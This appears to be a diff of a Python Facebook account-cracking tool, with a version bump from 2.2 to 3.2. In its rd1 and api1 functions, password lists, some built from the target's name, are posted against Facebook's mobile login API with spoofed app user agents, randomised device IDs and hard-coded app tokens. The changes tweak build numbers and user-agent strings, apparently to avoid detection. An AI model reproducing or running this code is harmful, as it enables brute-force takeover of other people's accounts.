@@ -69,7 +69,7 @@ Y\033[1;38m88b. .d88P Y88b  d88P 888        888  T88b
 \033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  ANIS Schiaparelli
 \033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  M.FARES 
 \033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE
-\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m2.2\033[1;37m 
+\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m3.2\033[1;37m 
 ------------------------------------------------""")
 
 def linex():
@@ -263,11 +263,11 @@ def rd1(ids,passlist):
 		for pas in passlist:
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-				fbbv = str(random.randint(000000000,999999999))
+				fbbv = str(random.randint(1000000000,9999999999))
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-				fbbv = str(random.randint(000000000,999999999))
-				fbrv = str(random.randint(000000000,999999999))
+				fbbv = str(random.randint(1000000000,9999999999))
+				fbrv = str(random.randint(1000000000,9999999999))
 				fbsv = str(random.randint(4,13))+'.0'
 				model,build = random.choice(samsung).split('|')
 				fbmf = 'samsung'
@@ -275,7 +275,7 @@ def rd1(ids,passlist):
 				en = random.choice(['en_US','en_GB'])
 				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
-				ua  = "[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+				ua  = "[FBAN/FB4A;FBAV/279.0.0.43.120;[FBAN/FB4A;FBAVFBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]]"
 				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
@@ -322,11 +322,11 @@ def api1(ids,names,passlist):
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-			fbbv = str(random.randint(000000000,999999999))
+			fbbv = str(random.randint(1000000000,9999999999))
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-			fbbv = str(random.randint(000000000,999999999))
-			fbrv = str(random.randint(000000000,999999999))
+			fbbv = str(random.randint(1000000000,9999999999))
+			fbrv = str(random.randint(1000000000,9999999999))
 			fbsv = str(random.randint(4,13))+'.0'
 			model,build = random.choice(samsung).split('|')
 			fbmf = 'samsung'
@@ -334,7 +334,7 @@ def api1(ids,names,passlist):
 			en = random.choice(['en_US','en_GB'])
 			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
-			ua  = "[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+			ua  = "[FBAN/FB4A;FBAV/279.0.0.43.120;[FBAN/FB4A;FBAVFBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
